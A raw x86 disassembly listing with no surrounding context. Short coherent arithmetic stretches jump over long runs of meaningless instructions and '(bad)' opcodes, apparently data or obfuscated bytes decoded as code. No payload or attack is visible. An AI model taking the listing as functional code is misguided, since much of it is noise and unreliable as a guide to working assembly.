  406d22:	fldenv [ebp-0x33]
  406d25:	clc    
  406d26:	sub    DWORD PTR [ebp-0x63758543],eax
  406d2c:	pop    ecx
  406d2e:	jnp    0x406d39
  406d30:	scas   al,BYTE PTR es:[edi]
  406d31:	xchg   DWORD PTR [edi+0x6ea2dc5b],edi
  406d37:	cmp    DWORD PTR [edi+0x27],0x89e8ab86
  406d3e:	push   cs
  406d3f:	xchg   ebx,eax
  406d41:	shl    ecx,0x1e
  406d44:	mov    ecx,DWORD PTR [ebp-0x14]
  406d47:	xor    edx,edx
  406d49:	or     eax,edx
  406d4b:	mov    cl,BYTE PTR [eax+ecx*1]
  406d4e:	mov    eax,DWORD PTR [ebp-0x34]
  406d51:	add    BYTE PTR [eax],cl
  406d53:	mov    eax,DWORD PTR [ebp-0x60]
  406d56:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d59:	shrd   eax,ecx,0x2
  406d5d:	shr    ecx,0x2
  406d60:	mov    ecx,DWORD PTR [ebp-0x60]
  406d63:	mov    edx,DWORD PTR [ebp-0x5c]
  406d66:	xor    eax,edi
  406d68:	xor    edx,edx
  406d6a:	or     eax,edx
  406d6c:	lea    eax,[ebp+eax*1-0x4]
  406d70:	mov    DWORD PTR [ebp-0x34],eax
  406d73:	mov    eax,DWORD PTR [ebp-0x60]
  406d76:	shl    ecx,0x1e
  406d79:	mov    ecx,DWORD PTR [ebp-0x5c]
  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x486a0603]
  406db5:	dec    DWORD PTR [edi+0x188b0a70]
  406dbb:	sbb    BYTE PTR [esi-0x1e7e7ee],bl
  406dc1:	xabort 0x2e
  406dc4:	sbb    DWORD PTR [esi],edi
  406dc6:	jmp    0x5758dc0d
  406dcb:	mov    ds:0xc643f75a,al
  406dd0:	jne    0x406e00
  406dd2:	xor    BYTE PTR [edi],cl
  406dd4:	xor    DWORD PTR [ebp-0x5a],ebx
  406dd7:	aaa    
  406dd8:	stos   BYTE PTR es:[edi],al
  406dd9:	data16 jmp 0x406e1d
  406ddc:	jle    0x406e17
  406dde:	jge    0x406e24
  406de0:	fmul   QWORD PTR [ebp-0x15]
  406de3:	pop    ds
  406de4:	mov    esi,DWORD PTR [edi-0x185326e1]
  406dea:	xor    bl,BYTE PTR [ebx-0x44e2bbc5]
  406df0:	xchg   esp,eax
  406df1:	mov    cs,WORD PTR [esi]
  406df3:	loope  0x406d77
  406df5:	jle    0x406df6
  406df7:	in     eax,0xda
  406df9:	fild   WORD PTR [ecx]
  406dfb:	and    eax,0xf339d7ed
  406e00:	xchg   DWORD PTR [edx],ecx
  406e02:	sub    DWORD PTR ds:0x39509829,0xaa04a9d1
  406e0c:	pop    ss
  406e0d:	dec    ebp
  406e0e:	sub    BYTE PTR ss:[esi],dh
  406e11:	dec    ecx
  406e12:	fnstcw WORD PTR [edx-0x24]
  406e15:	and    eax,DWORD PTR [ebp+0x53]
  406e18:	ret    
  406e19:	sti    
  406e1a:	jl     0x406e38
  406e1c:	inc    edi
  406e1d:	cli    
  406e1e:	out    0x51,al
  406e20:	in     eax,0x2f
  406e22:	fdiv   DWORD PTR [eax-0x280411e7]
  406e28:	arpl   ax,bx
  406e2a:	push   edi
  406e2b:	iret   
  406e2c:	je     0x406ddc
  406e2e:	push   ebx
  406e2f:	add    edx,DWORD PTR [esi+0x35]
  406e32:	lods   al,BYTE PTR ds:[esi]
  406e33:	cld    
  406e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e35:	cmp    esi,ebx
  406e37:	adc    DWORD PTR [ebx+0x647caf14],esi
  406e3d:	cmp    eax,0xc8a01a41
  406e42:	test   eax,0x999ec4a0
  406e47:	rcr    DWORD PTR [edx-0x62],cl
  406e4a:	pop    esi
  406e4b:	sbb    cl,BYTE PTR [esi+0x57aae92f]
  406e51:	cmp    DWORD PTR [esi],ecx
  406e53:	jmp    0x82dbd98
  406e58:	shl    DWORD PTR [esi+0x1f],1
  406e5b:	jb     0x406e26
  406e5d:	scas   al,BYTE PTR es:[edi]
  406e5e:	xchg   edi,eax
  406e5f:	or     DWORD PTR [esi],esi
  406e61:	std    
  406e62:	dec    edi
  406e63:	(bad)  
  406e64:	loopne 0x406e11
  406e66:	lock aad 0x12
  406e69:	fld    st(4)
  406e6b:	cmp    al,0xa4
  406e6d:	adc    ah,al
  406e6f:	fsubr  st(4),st
  406e71:	mov    WORD PTR [ecx+0x6d],ss
  406e74:	or     eax,0xcff0c577
  406e79:	cwde   
  406e7a:	mov    DWORD PTR [ebx-0x7f2c8d46],ebx
  406e80:	repnz test eax,0xfbf73a0d
  406e86:	iret   
  406e87:	arpl   WORD PTR [ebp+0x74317056],bx
  406e8d:	mov    ecx,0x86a453d1
  406e92:	jb     0x406e59
  406e94:	test   eax,0x565eef3d
  406e99:	out    0x56,al
  406e9b:	mov    ds:0x6e4e4d6e,al
  406ea0:	pop    edi
  406ea1:	mov    cl,0x18
  406ea3:	test   ax,0x379b
  406ea7:	jns    0x406f1a
  406ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eaa:	sti    
  406eab:	aaa    
  406eac:	mov    ch,0x36
  406eae:	jnp    0x406ee7
  406eb0:	das    
  406eb1:	iret   
  406eb2:	loope  0x406e57
  406eb4:	pop    esp
  406eb5:	daa    
  406eb6:	or     ah,ah
  406eb8:	iret   
  406eb9:	mov    eax,ds:0x298f3758
  406ebe:	mov    ch,0x28
  406ec0:	sti    
  406ec1:	xor    al,0x2c
  406ec3:	cdq    
  406ec4:	es sar ecx,1
  406ec7:	retf   
  406ec8:	and    bl,BYTE PTR [eax+0x66]
  406ecb:	mov    esi,0xf427d7ba
  406ed0:	sbb    al,BYTE PTR [ebx+0x70]
  406ed3:	mul    BYTE PTR [edi]
  406ed5:	daa    
  406ed6:	add    BYTE PTR [ecx+edx*4],dl
  406ed9:	jns    0x406ed3
  406edb:	xlat   BYTE PTR ds:[ebx]
  406edc:	mov    ecx,0xaf5e630f
  406ee1:	push   ebp
  406ee2:	inc    ecx
  406ee3:	cli    
  406ee4:	pop    ebx
  406ee5:	test   BYTE PTR [ecx-0x1e],ch
  406ee8:	add    esp,DWORD PTR [edi+edx*2-0x8a7c127]
  406eef:	frstor ds:0x4e88c814
  406ef5:	pop    ecx
  406ef6:	fs mov edx,0x14cba4be
  406efc:	cmp    al,0xb1
  406efe:	mov    WORD PTR [esi+0x143a90fb],ss
  406f04:	jnp    0x406edf
  406f06:	das    
  406f07:	sbb    DWORD PTR [edx-0x456e8d7f],eax
  406f0d:	jp     0x406e8f
  406f0f:	mov    esp,0x8edbd404
  406f14:	dec    edx
  406f15:	addr16 sti 
  406f17:	in     eax,0x4e
  406f19:	mov    edi,0x24025144
  406f1e:	pop    edi
  406f1f:	dec    ebp
  406f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f21:	out    0x30,al
  406f23:	rol    bl,0x52
  406f26:	std    
  406f27:	jnp    0x406f06
  406f29:	adc    edx,DWORD PTR [ecx-0xd]
  406f2c:	sar    DWORD PTR [eax+0x59f1684e],cl
  406f32:	mov    ebp,0xb3abe376
  406f37:	pop    esi
  406f38:	or     ah,BYTE PTR [esi]
  406f3a:	xchg   ebp,eax
  406f3b:	test   BYTE PTR [esi+0x4a],cl
  406f3e:	mov    esi,DWORD PTR [ecx+0x197bb5ef]
  406f44:	xor    eax,0x683c012d
  406f49:	xchg   edx,eax
  406f4a:	jno    0x406ef3
  406f4c:	in     al,0x11
  406f4e:	out    0x9e,eax
  406f50:	jae    0x406f4a
  406f52:	outs   dx,BYTE PTR cs:[esi]
  406f54:	fmul   st(3),st
  406f56:	and    BYTE PTR ds:0x18d1d49a,dl
  406f5c:	add    BYTE PTR [ebx],dh
  406f5e:	jl     0x406f31
  406f60:	popf   
  406f61:	scas   eax,DWORD PTR es:[edi]
  406f62:	(bad)  
  406f63:	pushf  
  406f64:	add    eax,DWORD PTR [ebp+ecx*4+0x4b]
  406f68:	sub    ecx,DWORD PTR [ebx-0x79]
  406f6b:	gs pushf 
  406f6d:	sbb    bh,al
  406f6f:	sub    dh,BYTE PTR [edi-0x3f73303a]
  406f75:	addr16 push ebp
  406f77:	nop
  406f78:	retf   0x6f90
  406f7b:	mov    eax,ds:0xd046d9f7
  406f80:	push   cs
  406f81:	sti    
  406f82:	(bad)  
  406f84:	fld    QWORD PTR [edx-0x10]
  406f87:	mov    edi,0x198a2a17
  406f8c:	fwait
  406f8d:	jae    0x406fe5
  406f8f:	fs mov esp,0xee349eb
  406f95:	mov    edi,0xe88c54d1
  406f9a:	mov    ebp,0x5a019c1e
  406f9f:	ins    BYTE PTR es:[edi],dx
  406fa0:	out    dx,eax
  406fa1:	test   eax,0x95ffa385
  406fa6:	jo     0x406fba
  406fa8:	loope  0x406fc2
  406faa:	jl     0x407009
  406fac:	cwde   
  406fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fae:	push   ecx
  406faf:	mov    ds:0x6dcfaaf0,al
  406fb4:	addr16 lock and al,0x21
  406fb8:	shl    BYTE PTR [ebx-0x43],1
  406fbb:	clc    
  406fbc:	cmc    
  406fbd:	sbb    DWORD PTR [ebp-0x5f],0x3b
  406fc1:	adc    al,BYTE PTR [ebx+0x66]
  406fc4:	add    al,0x82
  406fc6:	(bad)  
  406fc7:	idiv   BYTE PTR [edi+0x52]
  406fca:	fnstsw WORD PTR [edi-0x46232bf9]
  406fd0:	add    ecx,ebx
  406fd2:	pop    ecx
  406fd3:	cmp    al,dl
  406fd5:	cmc    
  406fd6:	gs dec edx
  406fd8:	out    0xc1,eax
  406fda:	pop    eax
  406fdb:	nop
  406fdc:	mov    bl,0x39
  406fde:	push   0x491232e4
  406fe3:	push   ebx
  406fe4:	pusha  
  406fe5:	loop   0x406fae
  406fe7:	jo     0x406feb
  406fe9:	(bad)  [eax-0x7f]
  406fec:	jo     0x406fdb
  406fee:	inc    ebp
  406fef:	jg     0x40704d
  406ff1:	or     al,0x68
  406ff3:	aas    
  406ff4:	sahf   
  406ff5:	hlt    
  406ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ff7:	cmp    ecx,DWORD PTR [ebp-0x4d]
  406ffa:	lods   al,BYTE PTR ds:[esi]
  406ffb:	das    
  406ffc:	fistp  QWORD PTR [edx]
  406ffe:	mov    DWORD PTR [eax],esi
  407000:	dec    ecx
  407001:	rol    BYTE PTR [ebx-0x22122e28],1
  407007:	lds    eax,FWORD PTR [ecx-0x79381183]
  40700d:	fdivp  st(7),st
  40700f:	(bad)  
  407010:	cmp    ecx,DWORD PTR [edx+0xdbe957c]
  407016:	cmp    ebp,DWORD PTR [eax]
  407018:	int3   
  407019:	xor    al,0x46
  40701b:	cmp    edx,DWORD PTR [esp+esi*4-0x19]
  40701f:	repnz repz pop esi
  407022:	jbe    0x407079
  407024:	adc    cl,BYTE PTR [edi-0x2356dc91]
  40702a:	es dec esp
  40702c:	push   0x28fdcb52
  407031:	js     0x407094
  407033:	dec    ebp
  407034:	stos   BYTE PTR es:[edi],al
  407035:	leave  
  407036:	lods   eax,DWORD PTR ds:[esi]
  407037:	ja     0x406fde
  407039:	out    0x3e,al
  40703b:	sbb    ecx,eax
  40703d:	rcl    DWORD PTR [edi+0x9149509],0x4f
  407044:	mov    esi,0x9f91151f
  407049:	imul   edx,DWORD PTR [edi],0xfed55a75
  40704f:	in     al,0xcb
  407051:	mov    ah,0x1
  407053:	enter  0xe054,0x32
  407057:	repnz call 0xcb74:0x648b1319
  40705f:	ins    BYTE PTR es:[edi],dx
  407060:	pop    es
  407061:	mov    eax,ds:0x9c04df30
  407066:	cld    
  407067:	jo     0x4070e4
  407069:	aas    
  40706a:	neg    BYTE PTR [edx+0x3f]
  40706d:	pop    ebp
  40706e:	sbb    eax,0xe50549bf
  407073:	icebp  
  407074:	mov    esp,0xcfc799cb
  407079:	iret   
  40707a:	ret    0x27cf
  40707d:	pop    edi
  40707e:	mov    ds:0xc31d0739,al
  407083:	mov    ds,edi
  407085:	push   eax
  407086:	leave  
  407087:	adc    al,0x50
  407089:	gs cli 
  40708b:	jmp    0x40707a
  40708d:	xchg   ebp,eax
  40708e:	add    cl,dl
  407090:	or     ecx,DWORD PTR [ecx]
  407092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407093:	sub    al,0xf8
  407095:	mov    ds:0x52cb8512,al
  40709a:	jnp    0x40710a
  40709c:	ins    DWORD PTR es:[edi],dx
  40709d:	adc    ebx,DWORD PTR [ebx+0x68]
  4070a0:	loop   0x4070ee
  4070a2:	test   ebp,edi
  4070a4:	lahf   
  4070a5:	mov    edi,?
  4070a7:	pushf  
  4070a8:	popf   
  4070a9:	sti    
  4070aa:	mov    WORD PTR [eax-0x3d],gs
  4070ad:	fnstsw WORD PTR [ebx-0x4175b514]
  4070b3:	in     al,dx
  4070b4:	cmp    ch,BYTE PTR [ecx]
  4070b6:	cmp    cl,BYTE PTR [edi+0x5d7a608a]
  4070bc:	sub    al,BYTE PTR [edi+0x37d6e806]
  4070c2:	aam    0x69
  4070c4:	jno    0x4070ce
  4070c6:	push   edx
  4070c7:	fs out 0x47,al
  4070ca:	sub    al,0x13
  4070cc:	test   DWORD PTR [ebx-0x3e],edi
  4070cf:	je     0x407054
  4070d1:	mov    ebp,DWORD PTR [ebx]
  4070d3:	(bad)  
  4070d4:	mov    WORD PTR [ecx+0x2],?
  4070d7:	test   al,0x5c
  4070d9:	pminub mm7,mm6
  4070dc:	sbb    al,0x1e
  4070de:	popf   
  4070df:	or     DWORD PTR [eax+0x2b8cce07],ebx
  4070e5:	in     eax,dx
  4070e6:	adc    DWORD PTR [ebx-0x6f],0xffffff9d
  4070ea:	in     eax,dx
  4070eb:	lock lahf 
  4070ed:	dec    ebp
  4070ee:	mov    ah,0xb4
  4070f0:	jbe    0x40711a
  4070f2:	pop    ebp
  4070f3:	pop    ebx
  4070f4:	mov    WORD PTR [eax+0x4d],ss
  4070f7:	jbe    0x4070f6
  4070f9:	adc    BYTE PTR [esi-0x2],0x57
  4070fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070fe:	xchg   ebp,eax
  4070ff:	sbb    al,0xea
  407101:	rcr    BYTE PTR [ebp+0x6a],cl
  407104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407105:	jp     0x407093
  407107:	push   eax
  407108:	call   0x3255:0x6a0a0e52
  40710f:	lods   al,BYTE PTR ds:[esi]
  407110:	cdq    
  407111:	scas   eax,DWORD PTR es:[edi]
  407112:	por    mm0,mm3
  407115:	mov    dh,0xf5
  407117:	les    eax,FWORD PTR [esi-0x1b315118]
  40711d:	inc    ebx
  40711e:	mov    ecx,0xe70a4491
  407123:	mov    ebp,0xe16fda53
  407128:	xor    DWORD PTR [ebx],esp
  40712a:	cli    
  40712b:	mov    cl,0xfd
  40712d:	ins    DWORD PTR es:[edi],dx
  40712e:	dec    esp
  40712f:	push   esi
  407130:	push   ecx
  407131:	fnsave [ecx-0x67]
  407134:	fmul   st,st(4)
  407136:	mov    bh,BYTE PTR [eax+ecx*8]
  407139:	(bad)  
  40713a:	in     al,0x9c
  40713c:	inc    edi
  40713d:	jp     0x4071a8
  40713f:	and    DWORD PTR [ebp-0x4b22f03c],esi
  407145:	jge    0x407109
  407147:	push   0x18a9581a
  40714c:	jns    0x40714d
  40714e:	pop    esi
  40714f:	hlt    
  407150:	iret   
  407151:	add    DWORD PTR [eax],edx
  407153:	dec    eax
  407154:	mov    dh,0x6
  407156:	mov    bl,0x3a
  407158:	test   BYTE PTR [ebp-0x7724b9cd],cl
  40715e:	dec    esi
  40715f:	icebp  
  407160:	scas   eax,DWORD PTR es:[edi]
  407161:	leave  
  407162:	xchg   esp,eax
  407163:	icebp  
  407164:	push   0x47d92f36
  407169:	add    eax,DWORD PTR [eax-0x39bd48a1]
  40716f:	sti    
  407170:	shl    DWORD PTR [esi],1
  407172:	(bad)  
  407173:	jg     0x40712e
  407175:	hlt    
  407176:	ret    
  407177:	cmc    
  407178:	loopne 0x4071f8
  40717a:	imul   ecx,eax,0x14
  40717d:	adc    eax,0x8b7d9b9b
  407182:	enter  0xac0f,0xd1
  407186:	add    al,cl
  407188:	loopne 0x4071a8
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	mov    BYTE PTR [ebp-0x7a6f4f95],ch
  4071ca:	sbb    BYTE PTR [eax],bl
  4071cc:	sahf   
  4071cd:	adc    bl,BYTE PTR [eax]
  4071cf:	sbb    BYTE PTR [ecx],al
  4071d1:	(bad)  
  4071d2:	gs das 
  4071d4:	push   cs
  4071d5:	outs   dx,BYTE PTR ds:[esi]
  4071d6:	cdq    
  4071d7:	or     cl,al
  4071d9:	dec    edi
  4071da:	dec    ebp
  4071db:	xchg   ebx,eax
  4071dc:	ror    BYTE PTR [esi-0x62271061],1
  4071e2:	push   ebx
  4071e3:	add    eax,0x83d3403
  4071e8:	add    al,0x6a
  4071ea:	jo     0x4071d2
  4071ec:	sub    ah,dl
  4071ee:	dec    esp
  4071ef:	push   es
  4071f0:	ds into 
  4071f2:	es ins DWORD PTR es:[edi],dx
  4071f4:	clc    
  4071f5:	jb     0x4071a7
  4071f7:	mov    bh,0xd5
  4071f9:	push   bp
  4071fb:	or     BYTE PTR [eax-0x23],0x6d
  4071ff:	icebp  
  407200:	adc    ah,dh
  407202:	cmp    ah,bh
  407204:	sub    ah,BYTE PTR [eax]
  407206:	mov    al,0xa1
  407208:	out    0xe2,eax
  40720a:	sbb    DWORD PTR [ebx-0x3200ab25],esi
  407210:	cmp    edi,eax
  407212:	lds    edx,FWORD PTR [ebx+0x3b]
  407215:	push   eax
  407216:	adc    BYTE PTR [ebx],bl
  407218:	sbb    DWORD PTR [edi-0x54],ebp
  40721b:	xlat   BYTE PTR gs:[ebx]
  40721d:	pop    edx
  40721e:	jge    0x407286
  407220:	loopne 0x40724c
  407222:	loop   0x4071e0
  407224:	je     0x4071f9
  407226:	and    bl,cl
  407228:	pop    ss
  407229:	push   ebp
  40722a:	pusha  
  40722b:	sub    BYTE PTR [ecx+edx*2+0x1d],al
  40722f:	and    dh,BYTE PTR [ecx+0x39]
  407232:	mov    edi,0x90c65cf1
  407237:	pop    ds
  407238:	add    eax,0x7eb4ef12
  40723d:	lods   eax,DWORD PTR ds:[esi]
  40723e:	pop    ecx
  40723f:	pop    esi
  407240:	jo     0x407273
  407242:	int    0x7d
  407244:	push   edx
  407245:	sub    DWORD PTR [ecx],edx
  407247:	inc    ebx
  407248:	inc    edi
  407249:	imul   ebp,DWORD PTR [edi+0x48],0x42585e29
  407250:	push   ss
  407251:	jno    0x40722b
  407253:	adc    BYTE PTR [eax-0x4e],ah
  407256:	push   ebx
  407257:	add    BYTE PTR [esi],bh
  407259:	mov    edx,0xd8798215
  40725e:	enter  0x52e4,0xd2
  407262:	ds or  al,0xd2
  407265:	sbb    eax,0x3ab4d14b
  40726a:	push   edi
  40726b:	in     eax,0xfb
  40726d:	jle    0x40723e
  40726f:	enter  0xbda6,0x72
  407273:	das    
  407274:	pop    ss
  407275:	fnstcw WORD PTR [ebx]
  407277:	jle    0x40725d
  407279:	les    esp,FWORD PTR [ecx-0x3]
  40727c:	jno    0x407226
  40727e:	sbb    BYTE PTR [ecx+eiz*4+0x14],bl
  407282:	loop   0x4072f9
  407284:	cmp    DWORD PTR [edx+eax*8+0x5895ae5e],ecx
  40728b:	jb     0x4072f6
  40728d:	in     eax,0xc2
  40728f:	xchg   ecx,eax
  407290:	enter  0xaaa7,0x7e
  407294:	cs (bad) 
  407296:	js     0x407271
  407298:	test   DWORD PTR [ecx],0x89980d8
  40729e:	retf   0x6457
  4072a1:	in     eax,0xe9
  4072a3:	cdq    
  4072a4:	ja     0x407251
  4072a6:	retf   0x3a8
  4072a9:	cli    
  4072aa:	cld    
  4072ab:	daa    
  4072ac:	pop    es
  4072ad:	add    esi,DWORD PTR ds:0xf68accb1
  4072b3:	test   eax,0x1d7df33d
  4072b8:	mov    edi,0x7d2dbf55
  4072bd:	xor    ch,BYTE PTR es:[edx+0x6bd89972]
  4072c4:	inc    edx
  4072c5:	xchg   esp,eax
  4072c6:	jns    0x40730a
  4072c8:	and    al,cl
  4072ca:	and    al,0x23
  4072cc:	cli    
  4072cd:	cdq    
  4072ce:	repz test ecx,esi
  4072d1:	and    eax,0x81e9d38a
  4072d6:	inc    esi
  4072d7:	pop    es
  4072d8:	mov    al,ds:0xc58f7798
  4072dd:	in     al,0xda
  4072df:	inc    esp
  4072e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072e1:	pop    edx
  4072e2:	mov    al,0x42
  4072e4:	fsubrp st(2),st
  4072e6:	imul   edi,DWORD PTR [edx-0xa],0xfffffffb
  4072ea:	push   ecx
  4072eb:	adc    DWORD PTR [ebx],ebp
  4072ed:	push   ds
  4072ee:	lahf   
  4072ef:	adc    esp,DWORD PTR [edx]
  4072f1:	xchg   BYTE PTR [ebx],cl
  4072f3:	mov    ?,WORD PTR [ecx+0x7a]
  4072f6:	fistp  DWORD PTR [edx]
  4072f8:	mov    bl,0x9e
  4072fa:	jo     0x40728c
  4072fc:	retf   
  4072fd:	fild   DWORD PTR ds:0x37ffd237
  407303:	mov    bh,0x26
  407305:	int3   
  407306:	add    ch,dh
  407308:	jno    0x407384
  40730a:	repz popa 
  40730c:	or     eax,0x480b3004
  407311:	out    0xe4,eax
  407313:	jb     0x4072ea
  407315:	test   ch,bh
  407317:	sbb    DWORD PTR [ebx],esp
  407319:	and    eax,0xa9c19406
  40731e:	dec    esi
  40731f:	mov    ch,0xa6
  407321:	pop    DWORD PTR [eax+0x45]
  407324:	js     0x407367
  407326:	call   0xc8f4:0x434b5a68
  40732d:	xchg   esi,eax
  40732e:	push   edi
  40732f:	dec    esp
  407330:	push   ds
  407331:	pop    DWORD PTR [edi-0x2efe427]
  407337:	loope  0x4072c2
  407339:	jns    0x407361
  40733b:	addr16 shl cl,1
  40733e:	lahf   
  40733f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407340:	or     DWORD PTR [edi],0xffffffaf
  407343:	repz adc bl,dh
  407346:	rol    esp,0x58
  407349:	pop    edi
  40734a:	out    dx,eax
  40734b:	outs   dx,BYTE PTR ds:[esi]
  40734c:	(bad)  
  40734d:	fimul  WORD PTR [edi+0x78]
  407350:	loop   0x40731c
  407352:	cmp    BYTE PTR [eax+0x2c],dl
  407355:	inc    eax
  407356:	pop    ss
  407357:	sub    edi,ebx
  407359:	imul   eax,DWORD PTR [esi],0xffffffd2
  40735c:	nop
  40735d:	pop    edi
  40735e:	mov    ch,0xbb
  407360:	mov    DWORD PTR [eax-0x7256b550],edi
  407366:	add    BYTE PTR ds:[ebp-0x18],bl
  40736a:	mov    esp,0xb5ceecb2
  40736f:	mov    bh,0xe1
  407371:	loope  0x40737d
  407373:	push   edx
  407374:	cmp    DWORD PTR [eax+0x6b],esi
  407377:	or     dh,BYTE PTR [ecx+0x30d97c78]
  40737d:	mov    bh,0x1d
  40737f:	ret    
  407380:	xlat   BYTE PTR ds:[ebx]
  407381:	mov    dl,0x4d
  407383:	in     eax,0xe4
  407385:	test   eax,0x75969f63
  40738a:	test   BYTE PTR [ebp+0x33c3e0f7],ch
  407390:	dec    ebx
  407391:	mov    cl,0x85
  407393:	(bad)  [edi+0x29]
  407396:	scas   eax,DWORD PTR es:[edi]
  407397:	stos   BYTE PTR es:[edi],al
  407398:	fsubr  st(7),st
  40739a:	xchg   ecx,eax
  40739b:	pop    DWORD PTR ds:0x3f7e7311
  4073a1:	mov    ds:0xd2db20a8,al
  4073a6:	or     eax,0x10499afa
  4073ab:	cwde   
  4073ac:	add    esp,DWORD PTR [edi]
  4073ae:	mov    eax,0xf0ebdc88
  4073b3:	dec    edx
  4073b4:	pop    ds
  4073b5:	pusha  
  4073b6:	loop   0x40736a
  4073b8:	mov    ch,0xaa
  4073ba:	jno    0x40740a
  4073bc:	mul    BYTE PTR [edx+0x409aafdc]
  4073c2:	mov    eax,ds:0xa52a4d85
  4073c7:	xor    DWORD PTR [ebp+0x683c575c],ebp
  4073cd:	shl    BYTE PTR [edx],1
  4073cf:	push   cs
  4073d0:	je     0x40736f
  4073d2:	jbe    0x407422
  4073d4:	not    DWORD PTR [ebp+0x79]
  4073d7:	or     ah,BYTE PTR [ecx+0x1ca66eaa]
  4073dd:	hlt    
  4073de:	shl    BYTE PTR [esi+0x62],cl
  4073e1:	inc    ebx
  4073e2:	into   
  4073e3:	cdq    
  4073e4:	retf   
  4073e5:	cli    
  4073e6:	mov    ebp,0xe28e22a6
  4073eb:	or     al,0x1d
  4073ed:	imul   esi,DWORD PTR [esi-0x52],0xffffffc0
  4073f1:	mov    ebp,0x4bf5feb8
  4073f6:	xlat   BYTE PTR ds:[ebx]
  4073f7:	pop    ecx
  4073f8:	jge    0x40745c
  4073fa:	sub    al,0x2c
  4073fc:	push   esp
  4073fd:	sub    edx,0x649b9884
  407403:	and    ecx,esi
  407405:	pop    edx
  407406:	inc    ecx
  407407:	xor    ah,BYTE PTR [ecx+0x7c7713d4]
  40740d:	inc    eax
  40740e:	xchg   edi,eax
  40740f:	retf   0x285c
  407412:	popa   
  407413:	out    0xbd,eax
  407415:	int    0xe
  407417:	daa    
  407418:	add    BYTE PTR [edi-0x64faad37],al
  40741e:	mov    fs,ebx
  407420:	dec    edi
  407421:	aam    0x57
  407423:	retf   0x805
  407426:	dec    esp
  407427:	rcr    BYTE PTR [ebp+0x4e],1
  40742a:	sbb    eax,0x364d8851
  40742f:	scas   eax,DWORD PTR es:[edi]
  407430:	jnp    0x4073c7
  407432:	jge    0x4073cb
  407434:	dec    ebx
  407435:	cwde   
  407436:	sbb    BYTE PTR [ecx],al
  407438:	fs inc esp
  40743a:	ins    DWORD PTR es:[edi],dx
  40743b:	stc    
  40743c:	jo     0x40744c
  40743e:	sbb    BYTE PTR [eax+0x16],cl
  407441:	xor    DWORD PTR [ecx+eax*1+0x7e2177f0],edx
  407448:	xor    BYTE PTR [ebx],bl
  40744a:	cmp    al,0x2b
  40744c:	inc    edx
  40744d:	and    BYTE PTR [esi],ah
  40744f:	hlt    
  407450:	push   cs
  407451:	dec    esp
  407452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407453:	jbe    0x407476
  407455:	push   0xffffff89
  407457:	inc    esi
  407458:	sti    
  407459:	js     0x407488
  40745b:	mov    dl,BYTE PTR fs:[ebx+0x40]
  40745f:	fldenv [esp+ebx*4-0x7075c2df]
  407466:	jp     0x40745b
  407468:	sbb    al,0x1b
  40746a:	push   ss
  40746b:	fnstsw WORD PTR [esi+0x7e]
  40746e:	jle    0x4073f4
  407470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407471:	cmp    ebp,DWORD PTR [edi+0x16]
  407474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407475:	or     eax,0xf1adbe0a
  40747a:	and    eax,0x96581d61
  40747f:	push   0x5b
  407481:	adc    DWORD PTR [ecx],0x4f465119
  407487:	test   esp,ecx
  407489:	cwde   
  40748a:	push   0x6ea953a0
  40748f:	sar    DWORD PTR [esi],cl
  407491:	pop    ss
  407492:	int3   
  407493:	aaa    
  407494:	add    DWORD PTR ds:0x3dd99702,eax
  40749a:	dec    ebp
  40749b:	inc    esp
  40749c:	cmp    eax,DWORD PTR [eax+0xb6a41cf]
  4074a2:	add    dl,BYTE PTR [ebx]
  4074a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074a5:	xor    bl,al
  4074a7:	das    
  4074a8:	and    al,dl
  4074aa:	jmp    0xd9df97be
  4074af:	dec    esi
  4074b0:	push   ebx
  4074b1:	mov    dl,0xf
  4074b3:	xchg   edx,eax
  4074b4:	fstp   QWORD PTR [ebx+0x70]
  4074b7:	add    BYTE PTR [ebx+eax*8],bl
  4074ba:	mov    edx,0x999a30fe
